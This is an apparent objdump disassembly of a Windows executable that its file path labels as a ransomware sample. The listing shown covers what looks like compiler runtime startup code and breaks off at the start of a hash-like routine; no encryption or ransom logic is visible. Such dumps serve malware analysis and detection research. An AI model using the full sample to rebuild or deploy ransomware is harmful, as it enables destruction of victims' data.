
malware_samples/ransomware/975ce7324577087376ddd373fce39f064422acc4a4555f64c34c743fd0a44cbb.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	55                   	push   %rbp
   140001001:	48 89 e5             	mov    %rsp,%rbp
   140001004:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140001008:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   14000100c:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140001010:	44 89 4d 28          	mov    %r9d,0x28(%rbp)
   140001014:	90                   	nop
   140001015:	5d                   	pop    %rbp
   140001016:	c3                   	ret
   140001017:	55                   	push   %rbp
   140001018:	48 89 e5             	mov    %rsp,%rbp
   14000101b:	48 83 ec 20          	sub    $0x20,%rsp
   14000101f:	e8 54 03 00 00       	call   0x140001378
   140001024:	89 05 f6 6f 02 00    	mov    %eax,0x26ff6(%rip)        # 0x140028020
   14000102a:	48 8b 05 4f 2d 02 00 	mov    0x22d4f(%rip),%rax        # 0x140023d80
   140001031:	8b 00                	mov    (%rax),%eax
   140001033:	85 c0                	test   %eax,%eax
   140001035:	74 0c                	je     0x140001043
   140001037:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000103c:	e8 af f0 01 00       	call   0x1400200f0
   140001041:	eb 0a                	jmp    0x14000104d
   140001043:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001048:	e8 a3 f0 01 00       	call   0x1400200f0
   14000104d:	e8 3e e8 01 00       	call   0x14001f890
   140001052:	48 8b 15 07 2e 02 00 	mov    0x22e07(%rip),%rdx        # 0x140023e60
   140001059:	8b 12                	mov    (%rdx),%edx
   14000105b:	89 10                	mov    %edx,(%rax)
   14000105d:	e8 3e e8 01 00       	call   0x14001f8a0
   140001062:	48 8b 15 d7 2d 02 00 	mov    0x22dd7(%rip),%rdx        # 0x140023e40
   140001069:	8b 12                	mov    (%rdx),%edx
   14000106b:	89 10                	mov    %edx,(%rax)
   14000106d:	e8 be 4d 01 00       	call   0x140015e30
   140001072:	48 8b 05 27 2c 02 00 	mov    0x22c27(%rip),%rax        # 0x140023ca0
   140001079:	8b 00                	mov    (%rax),%eax
   14000107b:	83 f8 01             	cmp    $0x1,%eax
   14000107e:	75 0f                	jne    0x14000108f
   140001080:	48 8b 05 f9 2d 02 00 	mov    0x22df9(%rip),%rax        # 0x140023e80
   140001087:	48 89 c1             	mov    %rax,%rcx
   14000108a:	e8 cb 56 01 00       	call   0x14001675a
   14000108f:	b8 00 00 00 00       	mov    $0x0,%eax
   140001094:	48 83 c4 20          	add    $0x20,%rsp
   140001098:	5d                   	pop    %rbp
   140001099:	c3                   	ret
   14000109a:	55                   	push   %rbp
   14000109b:	48 89 e5             	mov    %rsp,%rbp
   14000109e:	48 83 ec 30          	sub    $0x30,%rsp
   1400010a2:	48 8b 05 e7 2d 02 00 	mov    0x22de7(%rip),%rax        # 0x140023e90
   1400010a9:	8b 00                	mov    (%rax),%eax
   1400010ab:	89 05 77 6f 02 00    	mov    %eax,0x26f77(%rip)        # 0x140028028
   1400010b1:	48 8b 05 98 2d 02 00 	mov    0x22d98(%rip),%rax        # 0x140023e50
   1400010b8:	8b 10                	mov    (%rax),%edx
   1400010ba:	48 8d 05 67 6f 02 00 	lea    0x26f67(%rip),%rax        # 0x140028028
   1400010c1:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400010c6:	41 89 d1             	mov    %edx,%r9d
   1400010c9:	4c 8d 05 40 6f 02 00 	lea    0x26f40(%rip),%r8        # 0x140028010
   1400010d0:	48 8d 05 31 6f 02 00 	lea    0x26f31(%rip),%rax        # 0x140028008
   1400010d7:	48 89 c2             	mov    %rax,%rdx
   1400010da:	48 8d 05 23 6f 02 00 	lea    0x26f23(%rip),%rax        # 0x140028004
   1400010e1:	48 89 c1             	mov    %rax,%rcx
   1400010e4:	e8 17 f0 01 00       	call   0x140020100
   1400010e9:	89 05 29 6f 02 00    	mov    %eax,0x26f29(%rip)        # 0x140028018
   1400010ef:	90                   	nop
   1400010f0:	48 83 c4 30          	add    $0x30,%rsp
   1400010f4:	5d                   	pop    %rbp
   1400010f5:	c3                   	ret
   1400010f6:	55                   	push   %rbp
   1400010f7:	48 89 e5             	mov    %rsp,%rbp
   1400010fa:	48 83 ec 30          	sub    $0x30,%rsp
   1400010fe:	c7 45 fc ff 00 00 00 	movl   $0xff,-0x4(%rbp)
   140001105:	48 8b 05 74 2c 02 00 	mov    0x22c74(%rip),%rax        # 0x140023d80
   14000110c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001112:	e8 3d 00 00 00       	call   0x140001154
   140001117:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000111a:	90                   	nop
   14000111b:	90                   	nop
   14000111c:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000111f:	48 83 c4 30          	add    $0x30,%rsp
   140001123:	5d                   	pop    %rbp
   140001124:	c3                   	ret
   140001125:	55                   	push   %rbp
   140001126:	48 89 e5             	mov    %rsp,%rbp
   140001129:	48 83 ec 30          	sub    $0x30,%rsp
   14000112d:	c7 45 fc ff 00 00 00 	movl   $0xff,-0x4(%rbp)
   140001134:	48 8b 05 45 2c 02 00 	mov    0x22c45(%rip),%rax        # 0x140023d80
   14000113b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001141:	e8 0e 00 00 00       	call   0x140001154
   140001146:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140001149:	90                   	nop
   14000114a:	90                   	nop
   14000114b:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000114e:	48 83 c4 30          	add    $0x30,%rsp
   140001152:	5d                   	pop    %rbp
   140001153:	c3                   	ret
   140001154:	55                   	push   %rbp
   140001155:	48 89 e5             	mov    %rsp,%rbp
   140001158:	48 83 ec 70          	sub    $0x70,%rsp
   14000115c:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
   140001163:	00 
   140001164:	c7 45 e4 30 00 00 00 	movl   $0x30,-0x1c(%rbp)
   14000116b:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000116e:	65 48 8b 00          	mov    %gs:(%rax),%rax
   140001172:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140001176:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000117a:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000117e:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001182:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140001189:	eb 21                	jmp    0x1400011ac
   14000118b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000118f:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   140001193:	75 09                	jne    0x14000119e
   140001195:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   14000119c:	eb 45                	jmp    0x1400011e3
   14000119e:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011a3:	48 8b 05 9e f3 04 00 	mov    0x4f39e(%rip),%rax        # 0x140050548
   1400011aa:	ff d0                	call   *%rax
   1400011ac:	48 8b 05 1d 2c 02 00 	mov    0x22c1d(%rip),%rax        # 0x140023dd0
   1400011b3:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400011b7:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400011bb:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400011bf:	48 c7 45 c0 00 00 00 	movq   $0x0,-0x40(%rbp)
   1400011c6:	00 
   1400011c7:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   1400011cb:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   1400011cf:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   1400011d3:	f0 48 0f b1 0a       	lock cmpxchg %rcx,(%rdx)
   1400011d8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400011dc:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   1400011e1:	75 a8                	jne    0x14000118b
   1400011e3:	48 8b 05 f6 2b 02 00 	mov    0x22bf6(%rip),%rax        # 0x140023de0
   1400011ea:	8b 00                	mov    (%rax),%eax
   1400011ec:	83 f8 01             	cmp    $0x1,%eax
   1400011ef:	75 0c                	jne    0x1400011fd
   1400011f1:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400011f6:	e8 0d ef 01 00       	call   0x140020108
   1400011fb:	eb 3f                	jmp    0x14000123c
   1400011fd:	48 8b 05 dc 2b 02 00 	mov    0x22bdc(%rip),%rax        # 0x140023de0
   140001204:	8b 00                	mov    (%rax),%eax
   140001206:	85 c0                	test   %eax,%eax
   140001208:	75 28                	jne    0x140001232
   14000120a:	48 8b 05 cf 2b 02 00 	mov    0x22bcf(%rip),%rax        # 0x140023de0
   140001211:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001217:	48 8b 05 12 2c 02 00 	mov    0x22c12(%rip),%rax        # 0x140023e30
   14000121e:	48 89 c2             	mov    %rax,%rdx
   140001221:	48 8b 05 f8 2b 02 00 	mov    0x22bf8(%rip),%rax        # 0x140023e20
   140001228:	48 89 c1             	mov    %rax,%rcx
   14000122b:	e8 f0 ee 01 00       	call   0x140020120
   140001230:	eb 0a                	jmp    0x14000123c
   140001232:	c7 05 e8 6d 02 00 01 	movl   $0x1,0x26de8(%rip)        # 0x140028024
   140001239:	00 00 00 
   14000123c:	48 8b 05 9d 2b 02 00 	mov    0x22b9d(%rip),%rax        # 0x140023de0
   140001243:	8b 00                	mov    (%rax),%eax
   140001245:	83 f8 01             	cmp    $0x1,%eax
   140001248:	75 26                	jne    0x140001270
   14000124a:	48 8b 05 bf 2b 02 00 	mov    0x22bbf(%rip),%rax        # 0x140023e10
   140001251:	48 89 c2             	mov    %rax,%rdx
   140001254:	48 8b 05 a5 2b 02 00 	mov    0x22ba5(%rip),%rax        # 0x140023e00
   14000125b:	48 89 c1             	mov    %rax,%rcx
   14000125e:	e8 bd ee 01 00       	call   0x140020120
   140001263:	48 8b 05 76 2b 02 00 	mov    0x22b76(%rip),%rax        # 0x140023de0
   14000126a:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140001270:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140001274:	75 1e                	jne    0x140001294
   140001276:	48 8b 05 53 2b 02 00 	mov    0x22b53(%rip),%rax        # 0x140023dd0
   14000127d:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140001281:	48 c7 45 b0 00 00 00 	movq   $0x0,-0x50(%rbp)
   140001288:	00 
   140001289:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   14000128d:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140001291:	48 87 10             	xchg   %rdx,(%rax)
   140001294:	48 8b 05 65 2a 02 00 	mov    0x22a65(%rip),%rax        # 0x140023d00
   14000129b:	48 8b 00             	mov    (%rax),%rax
   14000129e:	48 85 c0             	test   %rax,%rax
   1400012a1:	74 1c                	je     0x1400012bf
   1400012a3:	48 8b 05 56 2a 02 00 	mov    0x22a56(%rip),%rax        # 0x140023d00
   1400012aa:	48 8b 00             	mov    (%rax),%rax
   1400012ad:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   1400012b3:	ba 02 00 00 00       	mov    $0x2,%edx
   1400012b8:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400012bd:	ff d0                	call   *%rax
   1400012bf:	e8 84 53 01 00       	call   0x140016648
   1400012c4:	48 8b 05 a5 2b 02 00 	mov    0x22ba5(%rip),%rax        # 0x140023e70
   1400012cb:	48 89 c1             	mov    %rax,%rcx
   1400012ce:	48 8b 05 63 f2 04 00 	mov    0x4f263(%rip),%rax        # 0x140050538
   1400012d5:	ff d0                	call   *%rax
   1400012d7:	48 8b 15 e2 2a 02 00 	mov    0x22ae2(%rip),%rdx        # 0x140023dc0
   1400012de:	48 89 02             	mov    %rax,(%rdx)
   1400012e1:	48 8d 05 18 fd ff ff 	lea    -0x2e8(%rip),%rax        # 0x140001000
   1400012e8:	48 89 c1             	mov    %rax,%rcx
   1400012eb:	e8 e0 e6 01 00       	call   0x14001f9d0
   1400012f0:	e8 4b 4b 01 00       	call   0x140015e40
   1400012f5:	8b 05 09 6d 02 00    	mov    0x26d09(%rip),%eax        # 0x140028004
   1400012fb:	48 8d 15 06 6d 02 00 	lea    0x26d06(%rip),%rdx        # 0x140028008
   140001302:	89 c1                	mov    %eax,%ecx
   140001304:	e8 73 01 00 00       	call   0x14000147c
   140001309:	e8 a9 47 01 00       	call   0x140015ab7
   14000130e:	48 8b 05 2b 2a 02 00 	mov    0x22a2b(%rip),%rax        # 0x140023d40
   140001315:	48 8b 00             	mov    (%rax),%rax
   140001318:	48 8b 15 f1 6c 02 00 	mov    0x26cf1(%rip),%rdx        # 0x140028010
   14000131f:	48 89 10             	mov    %rdx,(%rax)
   140001322:	48 8b 0d e7 6c 02 00 	mov    0x26ce7(%rip),%rcx        # 0x140028010
   140001329:	48 8b 15 d8 6c 02 00 	mov    0x26cd8(%rip),%rdx        # 0x140028008
   140001330:	8b 05 ce 6c 02 00    	mov    0x26cce(%rip),%eax        # 0x140028004
   140001336:	49 89 c8             	mov    %rcx,%r8
   140001339:	89 c1                	mov    %eax,%ecx
   14000133b:	e8 a0 47 01 00       	call   0x140015ae0
   140001340:	89 05 d6 6c 02 00    	mov    %eax,0x26cd6(%rip)        # 0x14002801c
   140001346:	8b 05 d4 6c 02 00    	mov    0x26cd4(%rip),%eax        # 0x140028020
   14000134c:	85 c0                	test   %eax,%eax
   14000134e:	75 0d                	jne    0x14000135d
   140001350:	8b 05 c6 6c 02 00    	mov    0x26cc6(%rip),%eax        # 0x14002801c
   140001356:	89 c1                	mov    %eax,%ecx
   140001358:	e8 0b ee 01 00       	call   0x140020168
   14000135d:	8b 05 c1 6c 02 00    	mov    0x26cc1(%rip),%eax        # 0x140028024
   140001363:	85 c0                	test   %eax,%eax
   140001365:	75 05                	jne    0x14000136c
   140001367:	e8 a4 ed 01 00       	call   0x140020110
   14000136c:	8b 05 aa 6c 02 00    	mov    0x26caa(%rip),%eax        # 0x14002801c
   140001372:	48 83 c4 70          	add    $0x70,%rsp
   140001376:	5d                   	pop    %rbp
   140001377:	c3                   	ret
   140001378:	55                   	push   %rbp
   140001379:	48 89 e5             	mov    %rsp,%rbp
   14000137c:	48 83 ec 20          	sub    $0x20,%rsp
   140001380:	48 8b 05 09 2a 02 00 	mov    0x22a09(%rip),%rax        # 0x140023d90
   140001387:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000138d:	48 8b 05 0c 2a 02 00 	mov    0x22a0c(%rip),%rax        # 0x140023da0
   140001394:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000139a:	48 8b 05 0f 2a 02 00 	mov    0x22a0f(%rip),%rax        # 0x140023db0
   1400013a1:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013a7:	48 8b 05 12 29 02 00 	mov    0x22912(%rip),%rax        # 0x140023cc0
   1400013ae:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400013b2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400013b6:	0f b7 00             	movzwl (%rax),%eax
   1400013b9:	66 3d 4d 5a          	cmp    $0x5a4d,%ax
   1400013bd:	74 0a                	je     0x1400013c9
   1400013bf:	b8 00 00 00 00       	mov    $0x0,%eax
   1400013c4:	e9 ad 00 00 00       	jmp    0x140001476
   1400013c9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400013cd:	8b 40 3c             	mov    0x3c(%rax),%eax
   1400013d0:	48 63 d0             	movslq %eax,%rdx
   1400013d3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400013d7:	48 01 d0             	add    %rdx,%rax
   1400013da:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400013de:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400013e2:	8b 00                	mov    (%rax),%eax
   1400013e4:	3d 50 45 00 00       	cmp    $0x4550,%eax
   1400013e9:	74 0a                	je     0x1400013f5
   1400013eb:	b8 00 00 00 00       	mov    $0x0,%eax
   1400013f0:	e9 81 00 00 00       	jmp    0x140001476
   1400013f5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400013f9:	48 83 c0 18          	add    $0x18,%rax
   1400013fd:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001401:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001405:	0f b7 00             	movzwl (%rax),%eax
   140001408:	0f b7 c0             	movzwl %ax,%eax
   14000140b:	3d 0b 01 00 00       	cmp    $0x10b,%eax
   140001410:	74 09                	je     0x14000141b
   140001412:	3d 0b 02 00 00       	cmp    $0x20b,%eax
   140001417:	74 29                	je     0x140001442
   140001419:	eb 56                	jmp    0x140001471
   14000141b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000141f:	8b 40 5c             	mov    0x5c(%rax),%eax
   140001422:	83 f8 0e             	cmp    $0xe,%eax
   140001425:	77 07                	ja     0x14000142e
   140001427:	b8 00 00 00 00       	mov    $0x0,%eax
   14000142c:	eb 48                	jmp    0x140001476
   14000142e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001432:	8b 80 d0 00 00 00    	mov    0xd0(%rax),%eax
   140001438:	85 c0                	test   %eax,%eax
   14000143a:	0f 95 c0             	setne  %al
   14000143d:	0f b6 c0             	movzbl %al,%eax
   140001440:	eb 34                	jmp    0x140001476
   140001442:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001446:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000144a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000144e:	8b 40 6c             	mov    0x6c(%rax),%eax
   140001451:	83 f8 0e             	cmp    $0xe,%eax
   140001454:	77 07                	ja     0x14000145d
   140001456:	b8 00 00 00 00       	mov    $0x0,%eax
   14000145b:	eb 19                	jmp    0x140001476
   14000145d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140001461:	8b 80 e0 00 00 00    	mov    0xe0(%rax),%eax
   140001467:	85 c0                	test   %eax,%eax
   140001469:	0f 95 c0             	setne  %al
   14000146c:	0f b6 c0             	movzbl %al,%eax
   14000146f:	eb 05                	jmp    0x140001476
   140001471:	b8 00 00 00 00       	mov    $0x0,%eax
   140001476:	48 83 c4 20          	add    $0x20,%rsp
   14000147a:	5d                   	pop    %rbp
   14000147b:	c3                   	ret
   14000147c:	55                   	push   %rbp
   14000147d:	53                   	push   %rbx
   14000147e:	48 83 ec 48          	sub    $0x48,%rsp
   140001482:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140001487:	89 4d 20             	mov    %ecx,0x20(%rbp)
   14000148a:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000148e:	8b 45 20             	mov    0x20(%rbp),%eax
   140001491:	83 c0 01             	add    $0x1,%eax
   140001494:	48 98                	cltq
   140001496:	48 c1 e0 03          	shl    $0x3,%rax
   14000149a:	48 89 c1             	mov    %rax,%rcx
   14000149d:	e8 0e ed 01 00       	call   0x1400201b0
   1400014a2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400014a6:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400014aa:	48 8b 00             	mov    (%rax),%rax
   1400014ad:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400014b1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400014b8:	e9 8f 00 00 00       	jmp    0x14000154c
   1400014bd:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400014c0:	48 98                	cltq
   1400014c2:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   1400014c9:	00 
   1400014ca:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400014ce:	48 01 d0             	add    %rdx,%rax
   1400014d1:	48 8b 00             	mov    (%rax),%rax
   1400014d4:	48 89 c1             	mov    %rax,%rcx
   1400014d7:	e8 2c ed 01 00       	call   0x140020208
   1400014dc:	48 83 c0 01          	add    $0x1,%rax
   1400014e0:	48 01 c0             	add    %rax,%rax
   1400014e3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400014e7:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400014ea:	48 98                	cltq
   1400014ec:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   1400014f3:	00 
   1400014f4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400014f8:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
   1400014fc:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140001500:	48 89 c1             	mov    %rax,%rcx
   140001503:	e8 a8 ec 01 00       	call   0x1400201b0
   140001508:	48 89 03             	mov    %rax,(%rbx)
   14000150b:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000150e:	48 98                	cltq
   140001510:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   140001517:	00 
   140001518:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000151c:	48 01 d0             	add    %rdx,%rax
   14000151f:	48 8b 10             	mov    (%rax),%rdx
   140001522:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001525:	48 98                	cltq
   140001527:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
   14000152e:	00 
   14000152f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001533:	48 01 c8             	add    %rcx,%rax
   140001536:	48 8b 00             	mov    (%rax),%rax
   140001539:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000153d:	49 89 c8             	mov    %rcx,%r8
   140001540:	48 89 c1             	mov    %rax,%rcx
   140001543:	e8 78 ec 01 00       	call   0x1400201c0
   140001548:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   14000154c:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000154f:	3b 45 20             	cmp    0x20(%rbp),%eax
   140001552:	0f 8c 65 ff ff ff    	jl     0x1400014bd
   140001558:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000155b:	48 98                	cltq
   14000155d:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   140001564:	00 
   140001565:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001569:	48 01 d0             	add    %rdx,%rax
   14000156c:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140001573:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140001577:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   14000157b:	48 89 10             	mov    %rdx,(%rax)
   14000157e:	90                   	nop
   14000157f:	48 83 c4 48          	add    $0x48,%rsp
   140001583:	5b                   	pop    %rbx
   140001584:	5d                   	pop    %rbp
   140001585:	c3                   	ret
   140001586:	55                   	push   %rbp
   140001587:	48 89 e5             	mov    %rsp,%rbp
   14000158a:	48 83 ec 20          	sub    $0x20,%rsp
   14000158e:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140001592:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001596:	48 89 c1             	mov    %rax,%rcx
   140001599:	e8 92 eb 01 00       	call   0x140020130
   14000159e:	48 85 c0             	test   %rax,%rax
   1400015a1:	74 07                	je     0x1400015aa
   1400015a3:	b8 00 00 00 00       	mov    $0x0,%eax
   1400015a8:	eb 05                	jmp    0x1400015af
   1400015aa:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400015af:	48 83 c4 20          	add    $0x20,%rsp
   1400015b3:	5d                   	pop    %rbp
   1400015b4:	c3                   	ret
   1400015b5:	90                   	nop
   1400015b6:	90                   	nop
   1400015b7:	90                   	nop
   1400015b8:	90                   	nop
   1400015b9:	90                   	nop
   1400015ba:	90                   	nop
   1400015bb:	90                   	nop
   1400015bc:	90                   	nop
   1400015bd:	90                   	nop
   1400015be:	90                   	nop
   1400015bf:	90                   	nop
   1400015c0:	c3                   	ret
   1400015c1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400015c8:	00 00 00 00 
   1400015cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400015d0:	31 c0                	xor    %eax,%eax
   1400015d2:	c3                   	ret
   1400015d3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400015da:	00 00 00 00 
   1400015de:	66 90                	xchg   %ax,%ax
   1400015e0:	55                   	push   %rbp
   1400015e1:	57                   	push   %rdi
   1400015e2:	56                   	push   %rsi
   1400015e3:	53                   	push   %rbx
   1400015e4:	48 83 ec 28          	sub    $0x28,%rsp
   1400015e8:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400015ed:	48 8d 35 0c 0a 02 00 	lea    0x20a0c(%rip),%rsi        # 0x140022000
   1400015f4:	48 89 f1             	mov    %rsi,%rcx
   1400015f7:	ff 15 83 ee 04 00    	call   *0x4ee83(%rip)        # 0x140050480
   1400015fd:	48 89 c3             	mov    %rax,%rbx
   140001600:	48 85 c0             	test   %rax,%rax
   140001603:	74 6b                	je     0x140001670
   140001605:	48 89 f1             	mov    %rsi,%rcx
   140001608:	ff 15 da ee 04 00    	call   *0x4eeda(%rip)        # 0x1400504e8
   14000160e:	48 8b 3d 7b ee 04 00 	mov    0x4ee7b(%rip),%rdi        # 0x140050490
   140001615:	48 8d 15 f7 09 02 00 	lea    0x209f7(%rip),%rdx        # 0x140022013
   14000161c:	48 89 d9             	mov    %rbx,%rcx
   14000161f:	48 89 05 1a 6a 02 00 	mov    %rax,0x26a1a(%rip)        # 0x140028040
   140001626:	ff d7                	call   *%rdi
   140001628:	48 8d 15 fa 09 02 00 	lea    0x209fa(%rip),%rdx        # 0x140022029
   14000162f:	48 89 d9             	mov    %rbx,%rcx
   140001632:	48 89 c6             	mov    %rax,%rsi
   140001635:	ff d7                	call   *%rdi
   140001637:	48 89 05 c2 f9 01 00 	mov    %rax,0x1f9c2(%rip)        # 0x140021000
   14000163e:	48 85 f6             	test   %rsi,%rsi
   140001641:	74 10                	je     0x140001653
   140001643:	48 8d 15 16 6a 02 00 	lea    0x26a16(%rip),%rdx        # 0x140028060
   14000164a:	48 8d 0d af 39 02 00 	lea    0x239af(%rip),%rcx        # 0x140025000
   140001651:	ff d6                	call   *%rsi
   140001653:	48 8d 0d 36 00 00 00 	lea    0x36(%rip),%rcx        # 0x140001690
   14000165a:	48 83 c4 28          	add    $0x28,%rsp
   14000165e:	5b                   	pop    %rbx
   14000165f:	5e                   	pop    %rsi
   140001660:	5f                   	pop    %rdi
   140001661:	5d                   	pop    %rbp
   140001662:	e9 1f ff ff ff       	jmp    0x140001586
   140001667:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000166e:	00 00 
   140001670:	48 8d 05 59 ff ff ff 	lea    -0xa7(%rip),%rax        # 0x1400015d0
   140001677:	48 8d 35 42 ff ff ff 	lea    -0xbe(%rip),%rsi        # 0x1400015c0
   14000167e:	48 89 05 7b f9 01 00 	mov    %rax,0x1f97b(%rip)        # 0x140021000
   140001685:	eb bc                	jmp    0x140001643
   140001687:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000168e:	00 00 
   140001690:	55                   	push   %rbp
   140001691:	48 89 e5             	mov    %rsp,%rbp
   140001694:	48 83 ec 20          	sub    $0x20,%rsp
   140001698:	48 8b 05 61 f9 01 00 	mov    0x1f961(%rip),%rax        # 0x140021000
   14000169f:	48 85 c0             	test   %rax,%rax
   1400016a2:	74 09                	je     0x1400016ad
   1400016a4:	48 8d 0d 55 39 02 00 	lea    0x23955(%rip),%rcx        # 0x140025000
   1400016ab:	ff d0                	call   *%rax
   1400016ad:	48 8b 0d 8c 69 02 00 	mov    0x2698c(%rip),%rcx        # 0x140028040
   1400016b4:	48 85 c9             	test   %rcx,%rcx
   1400016b7:	74 0f                	je     0x1400016c8
   1400016b9:	48 83 c4 20          	add    $0x20,%rsp
   1400016bd:	5d                   	pop    %rbp
   1400016be:	48 ff 25 6b ed 04 00 	rex.W jmp *0x4ed6b(%rip)        # 0x140050430
   1400016c5:	0f 1f 00             	nopl   (%rax)
   1400016c8:	48 83 c4 20          	add    $0x20,%rsp
   1400016cc:	5d                   	pop    %rbp
   1400016cd:	c3                   	ret
   1400016ce:	90                   	nop
   1400016cf:	90                   	nop
   1400016d0:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400016d7:	00 00 00 
   1400016da:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400016e1:	00 00 00 
   1400016e4:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400016eb:	00 00 00 
   1400016ee:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400016f5:	00 00 00 
   1400016f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400016ff:	00 
   140001700:	55                   	push   %rbp
   140001701:	57                   	push   %rdi
   140001702:	56                   	push   %rsi
   140001703:	53                   	push   %rbx
   140001704:	48 ba c5 67 56 16 2f 	movabs $0x27d4eb2f165667c5,%rdx
   14000170b:	eb d4 27 
   14000170e:	49 89 c9             	mov    %rcx,%r9
   140001711:	48 8d 49 28          	lea    0x28(%rcx),%rcx
   140001715:	45 8b 41 48          	mov    0x48(%r9),%r8d
   140001719:	49 8b 79 18          	mov    0x18(%r9),%rdi
   14000171d:	4d 8b 11             	mov    (%r9),%r10
   140001720:	49 01 c8             	add    %rcx,%r8
   140001723:	48 01 fa             	add    %rdi,%rdx
   140001726:	49 83 fa 1f          	cmp    $0x1f,%r10
